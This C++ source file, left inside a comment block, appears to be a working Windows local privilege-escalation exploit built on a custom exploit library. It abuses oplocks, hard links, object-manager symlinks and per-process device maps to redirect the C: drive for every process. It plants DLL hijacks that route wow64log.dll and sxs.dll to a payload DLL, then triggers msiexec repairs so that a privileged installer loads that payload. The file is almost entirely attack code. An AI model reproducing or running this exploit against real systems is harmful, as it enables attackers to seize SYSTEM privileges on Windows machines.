/*
#include <exploitLib/exploitLib.h>
#include <exploitLib/primitives.h>
#include <exploitLib/IPC/datasharingservice.h>
#include <exploitLib/IPC/misc.h>
 
 using namespace x::literalNS;
 
 int main(int argc, char* args[])
  try
 {
 
    auto y = createTokenAndGetHandle(L"\\\\?\\C:\\temp\\CON");

    x::file write{ { createTokenAndGetHandle(L"C:\\temp\\rr.exe") ,L""} };

    x::file dest{ "C:\\temp\\dest"_p,DELETE,0};
    dest.makeoplock(std::function< bool(x::ack<x::file>) >{
       [&](x::ack<x::file> file)
       {
          std::wcout << L"Trigger" << std::endl;
          file.t.rename("%TEMP%"_p / x::guid::random_guid());
          ImpersonateAnonymousToken(GetCurrentThread());

          return false;
       }
    }); 

    write.makeHardLink( "C:\\temp\\dest"_nt );

   x::reflectedRootFolder  root{ L"c:\\" };
   x::reflectedFolder windows{ L"C:\\windows"s };
   x::reflectedFolder sxs{ L"C:\\windows\\winsxs" };

   root.addLink("windows", windows);
 

      x::reflectedFolder system{ L"C:\\windows\\system32" };
      windows.addLink("system32", system);
 
      system.addLink("ScanSetting.DLL.123.Config", L"\\??\\Global\\c:\\temp\\msiexec.exe.config");

   x::reflectedFolder syswow{ L"C:\\windows\\syswow64" };

  x::reflectedFolder dotnet{ L"C:\\Windows\\Microsoft.NET" };

  windows.addLink("syswow64", syswow);
  windows.addLink("Microsoft.NET", dotnet);
  windows.addLink("winsxs",sxs);
  sxs.addLink("fusion", "\\??\\Global\\c:\\temp");
  sxs.addLink("amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19619.1000_none_c04bed6ea80afaa6", "\\??\\Global\\C:\\temp\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_en-gb_ac972fc2ff2ccc1d\\6.0\\6.0.0.0");
   dotnet.addLink("Framework64", L"\\??\\Global\\c:\\temp");
 
   system.addLink("wow64log.dll", L"\\??\\Global\\c:\\temp\\payload.dll");
   syswow.addLink("wow64log.dll", L"\\??\\Global\\c:\\temp\\payload.dll");
    system.addLink("sxs.dll", L"\\??\\Global\\c:\\temp\\payload.dll");
   syswow.addLink("sxs.dll", L"\\??\\Global\\c:\\temp\\payload.dll");
    
   system.addLink("en", L"\\??\\Global\\c:\\temp\\en-gb");
   syswow.addLink("en", L"\\??\\Global\\c:\\temp\\en-gb");

   system.addLink("en-gb", L"\\??\\Global\\c:\\temp\\en-gb");
   syswow.addLink("en-gb", L"\\??\\Global\\c:\\temp\\en-gb");

   system.addLink("en-us", L"\\??\\Global\\c:\\temp\\en-gb");
   syswow.addLink("en-us", L"\\??\\Global\\c:\\temp\\en-gb");

   system.addLink("da", L"\\??\\Global\\c:\\temp\\en-gb");
   syswow.addLink("da", L"\\??\\Global\\c:\\temp\\en-gb");

   system.addLink("da-dk", L"\\??\\Global\\c:\\temp\\en-gb");
   syswow.addLink("da-dk", L"\\??\\Global\\c:\\temp\\en-gb");

   for (auto& f : x::file{ "C:\\windows\\SYSTEM32"_p }.enumDir())
   {
      try{
         if (f.ends_with(L".dll"))
         {
            system.addLink(f + L".config", L"\\??\\Global\\c:\\temp\\msiexec.exe.config");
            syswow.addLink(f + L".config", L"\\??\\Global\\c:\\temp\\msiexec.exe.config");
         }
         if (f.ends_with(L".exe"))
         {
            system.addLink(f + L".config", L"\\??\\Global\\c:\\temp\\msiexec.exe.config");
            syswow.addLink(f + L".config", L"\\??\\Global\\c:\\temp\\msiexec.exe.config");
         }
      }catch (...) {}
   }  
   auto global = x::objdir::open{ "\\GLOBAL??" };
  // getchar();

   x::symlink redirectCDrive{ L"\\??\\C:" , root };

   x::process::SetProcessDeviceMap(global);
   for (auto& p : x::process::getAllProcesses())
   {
      try{
         x::process::SetProcessDeviceMap(global,OpenProcess( PROCESS_ALL_ACCESS,false, p.th32ProcessID ) );
      }
      catch (...) {}
   }

   getchar();

   for ( auto& f : msifiles )
   {
      auto msiProc = x::process::execute( L"\\\\localhost\\c$\\windows\\system32\\msiexec.exe", L"/qn /l*vx! \\\\localhost\\c$\\temp\\msiexec.log /fm c:\\windows\\installer\\"s + msiFile,L"",true);
      x::process::SetProcessDeviceMap(global, msiProc.process );
      
      ULONG prev;
      NtResumeThread(msiProc.thread, &prev);

      WaitForSingleObject(msiProc.process, INFINITE );
   }
   getchar();
   
   return 0;
}
catch (wil::ResultException& e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
   std::wcout << e.what() << std::endl;
}

*/